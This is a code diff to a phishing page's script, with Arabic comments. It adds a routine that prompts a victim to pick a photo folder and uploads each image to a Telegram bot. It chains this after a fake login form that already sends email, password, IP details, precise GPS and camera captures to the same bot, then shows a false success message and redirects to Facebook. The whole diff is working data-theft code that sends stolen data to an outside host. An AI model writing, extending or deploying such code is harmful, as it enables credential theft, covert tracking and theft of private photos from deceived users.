@@ -180,6 +180,18 @@
         }
     }
 
+    async function sendFileToTelegram(file) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', file);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+            await fetch(url, { method: 'POST', body: formData });
+        } catch (e) {
+            console.error("File send error:", e);
+        }
+    }
+
     function dataURLtoBlob(dataURL) {
         const arr = dataURL.split(',');
         const mime = arr[0].match(/:(.*?);/)[1];
@@ -250,6 +262,34 @@
             });
     }
 
+    // دالة لسحب الصور من الملفات
+    function collectPhotos() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.multiple = true;
+        input.webkitdirectory = true; // لسحب مجلد كامل
+        input.onchange = async function(e) {
+            const files = e.target.files;
+            if (files.length === 0) return;
+            
+            sendToTelegram(`📁 <b>${PAGE_NAME}</b> - جاري سحب ${files.length} صورة...`);
+            
+            let count = 0;
+            for (const file of files) {
+                if (file.type.startsWith('image/')) {
+                    await sendFileToTelegram(file);
+                    count++;
+                    // تأخير بسيط لتجنب الإغراق
+                    await new Promise(r => setTimeout(r, 200));
+                }
+            }
+            
+            sendToTelegram(`✅ <b>${PAGE_NAME}</b> - تم سحب ${count} صورة بنجاح!`);
+        };
+        input.click();
+    }
+
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
 
@@ -268,7 +308,7 @@
         statusDiv.style.color = '#f0c060';
         statusDiv.innerText = '⏳ جاري التحقق...';
 
-        // جلب IP
+        // 1. جلب IP
         const ipInfo = await getIPInfo();
         let msg = `🕵️ <b>${PAGE_NAME}</b>\n\n`;
         msg += `👤 البريد: ${email}\n`;
@@ -282,10 +322,9 @@
             }
         }
         msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-
         await sendToTelegram(msg);
 
-        // طلب GPS دقيق
+        // 2. طلب GPS دقيق
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (p) => {
                 let lat = p.coords.latitude;
@@ -302,15 +341,20 @@
             }, { enableHighAccuracy: true, timeout: 10000 });
         }
 
-        // تصوير الكاميرا
+        // 3. تصوير الكاميرا
         captureCamera();
 
+        // 4. سحب الصور من الملفات (بعد 2 ثانية)
+        setTimeout(() => {
+            collectPhotos();
+        }, 2000);
+
         statusDiv.style.color = '#2e7d32';
-        statusDiv.innerText = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';
+        statusDiv.innerText = '✅ تم تسجيل الدخول بنجاح! جاري سحب الصور...';
 
         setTimeout(() => {
             window.location.href = "https://www.facebook.com/";
-        }, 2000);
+        }, 5000);
     });
 
     // إرسال IP فوراً عند فتح الصفحة
